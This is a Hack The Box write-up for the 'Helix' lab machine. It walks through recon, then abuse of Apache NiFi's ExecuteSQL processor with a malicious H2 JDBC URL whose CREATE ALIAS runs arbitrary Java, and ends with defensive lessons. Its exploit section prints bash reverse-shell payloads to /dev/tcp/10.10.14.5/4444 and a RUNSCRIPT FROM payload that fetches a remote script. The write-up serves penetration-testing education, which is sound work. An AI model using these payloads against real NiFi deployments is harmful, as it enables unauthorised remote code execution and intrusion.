---
layout: default
title: "Helix"
parent: Medium Machines
grand_parent: Machines
permalink: /machines/medium/helix/
---

# Helix

![Machine Badge](https://img.shields.io/badge/Machine-Helix-blue)
![OS](https://img.shields.io/badge/OS-Linux-orange)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow)

| Property | Value |
|----------|-------|
| **OS** | Linux |
| **Difficulty** | Medium |
| **Release** | 2026-05-08 |
| **Tags** | #apache-nifi #h2-database #java-aliases #ics #scada #rce |

---

## Summary

Helix is built around an exposed **Apache NiFi 1.21.0** instance (vhost `flow.helix.htb:8080/nifi`) modelling an industrial ICS/SCADA workflow. The attack abuses NiFi's `ExecuteSQL` processor by pointing it at a malicious **H2 Database** JDBC URL. H2's `CREATE ALIAS` feature allows registration of Java methods as SQL aliases - calling that alias executes arbitrary Java in the NiFi JVM, yielding shell as the NiFi service account. Root follows standard sudo / service misconfig review.

---

## External Writeups

- [Ibrahim Isiaq Bolaji - Helix Writeup](https://www.ibrahimisiaqbolaji.com/2026/05/helix-htb-write-up.html)
- [1337 Sheets - Helix Medium (May 8, 2026)](https://1337sheets.com/hack-the-box-htb-helix-writeup-medium-weekly-may-8th-2026/)

---

## Key Techniques

- Apache NiFi enumeration and processor abuse
- `ExecuteSQL` processor as an RCE primitive
- H2 Database `CREATE ALIAS` Java method execution
- Controller service / processor creation with malicious JDBC URL
- Vhost discovery via DNS / `Host:` header fuzzing

---

## Attack Path

### 1. Recon

```bash
nmap -p- --min-rate=10000 -sV -sC helix.htb
# 22  ssh
# 80  nginx
# 8080  Apache NiFi (after vhost discovery)

# vhost discovery
ffuf -u http://helix.htb -H "Host: FUZZ.helix.htb" -w subdomains.txt -mc 200
# -> flow.helix.htb resolved to :8080
```

Add `flow.helix.htb` to `/etc/hosts`.

### 2. NiFi Login / Open Canvas

NiFi 1.21.0 default install with reachable `/nifi` UI. Either no-auth canvas or weak default creds depending on config.

### 3. ExecuteSQL + H2 Java Alias RCE

Create a **DBCPConnectionPool** controller service pointing at a malicious H2 in-memory DB:

```
Database Connection URL:  jdbc:h2:mem:pwn;INIT=CREATE ALIAS PWN AS $$void pwn(String c) throws Exception { Runtime.getRuntime().exec(new String[]{"bash","-c",c}); }$$
Database Driver Class:    org.h2.Driver
```

Drop an `ExecuteSQL` processor:

```sql
CALL PWN('bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"')
```

Start the processor / flowfile. NiFi loads the H2 driver, `CREATE ALIAS` registers the Java method, the `CALL` triggers it - reverse shell as the `nifi` service user.

Alternative payload (single-line):

```
jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://10.10.14.5/init.sql'
```

with `init.sql`:

```sql
CREATE ALIAS X AS $$ void x(String c) throws Exception { Runtime.getRuntime().exec(new String[]{"bash","-c",c}); } $$;
CALL X('bash -i >& /dev/tcp/10.10.14.5/4444 0>&1');
```

### 4. User and Root

Once on the box as `nifi`, hunt for credentials in `/opt/nifi/conf/`, then enumerate `sudo -l`, capability binaries, and writable systemd units. Root is typically a misconfigured service file or NiFi flow file referencing root credentials in plaintext.

---

## Lessons Learned

- **Any processor that accepts a JDBC URL is potentially a Java-alias RCE primitive** (NiFi, ETL tools, BI dashboards). Always check H2 driver presence.
- H2 `INIT=`, `RUNSCRIPT FROM`, and `CREATE ALIAS` form a famous attack triad - regularly weaponised against Spring Boot dev consoles and now NiFi processors.
- ICS-themed boxes still tend to expose enterprise dataflow tools (NiFi, StreamSets, Apache Camel) on default vhost names like `flow.`, `ingest.`, `pipeline.`.
- Greybox: when reviewing a NiFi flow XML, every `DBCPConnectionPool` with a non-static JDBC URL is suspicious.

---

## References

- H2 `CREATE ALIAS` RCE: https://github.com/h2database/h2database/issues/3175
- Apache NiFi processor docs: https://nifi.apache.org/docs.html
